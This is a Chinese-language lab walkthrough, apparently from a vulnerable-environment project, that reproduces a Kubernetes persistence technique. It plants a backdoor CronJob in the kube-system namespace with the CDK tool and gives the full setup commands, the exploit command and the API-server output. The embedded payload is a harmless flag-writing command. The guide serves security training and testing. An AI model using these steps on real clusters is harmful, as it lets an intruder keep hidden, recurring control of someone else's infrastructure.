# 部署K8s后门CronJob

## 场景介绍

Cronjob是K8s集群的一种资源，类似于Linux系统中的cron任务，可在指定的时间间隔内运行任务，创建一个或多个Pod副本。

在集群内获取到一定的权限，需要对当前的权限进行持久化控制时，可利用K8s Cronjob资源的特性，创建一个kube-system命名空间下的Cronjob资源，进行持久化控制。

## 环境搭建

基础环境（Docker+K8s）准备（如果已经有任意版本的Docker+K8s环境则可跳过）：

```bash
./metarget gadget install docker --version 18.03.1
./metarget gadget install k8s --version 1.16.5 --domestic
```

漏洞环境准备：

```bash
./metarget cnv install k8s_backdoor_cronjob
```

执行完成后，K8s集群内`metarget`命令空间下将会创建一个名为`k8s-backdoor-cronjob`的pod。

## 漏洞复现

下载漏洞利用工具[CDK](https://github.com/cdk-team/CDK)，将其传入`k8s-backdoor-cronjob`pod中：

```
sudo kubectl cp cdk k8s-backdoor-cronjob:/ -n metarget
```

执行以下命令运行工具（该命令会每隔一分钟在kubs-system命名空间下创建一个pod执行指定命令）：

```
sudo kubectl exec -it k8s-backdoor-cronjob /cdk run k8s-cronjob default min ubuntu "date > /tmp/flag ; sleep 10000"
```

查看执行结果包含以下字段则部署成功，也可通过运行`sudo kubectl get cronjobs -n kube-sytem | grep cdk` 验证部署结果。

```
api-server response:
{"kind":"CronJob","apiVersion":"batch/v1beta1","metadata":{"name":"cdk-backdoor-cronjob","namespace":"kube-system","selfLink":"/apis/batch/v1beta1/namespaces/kube-system/cronjobs/cdk-backdoor-cronjob","uid":"e2fa6c8a-e05f-4d33-b6f7-4c1c9a54954f","resourceVersion":"7656","creationTimestamp":"2022-08-26T10:18:15Z"},"spec":{"schedule":"* * * * *","concurrencyPolicy":"Allow","suspend":false,"jobTemplate":{"metadata":{"creationTimestamp":null},"spec":{"template":{"metadata":{"creationTimestamp":null},"spec":{"containers":[{"name":"cdk-backdoor-cronjob-container","image":"ubuntu","args":["/bin/sh","-c","date \u003e /tmp/flag ; sleep 10000"],"resources":{},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"OnFailure","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","securityContext":{},"schedulerName":"default-scheduler"}}}},"successfulJobsHistoryLimit":3,"failedJobsHistoryLimit":1},"status":{}}
```

注：复现后请及时清除相关资源。

## 参考文献

1. https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-cronjob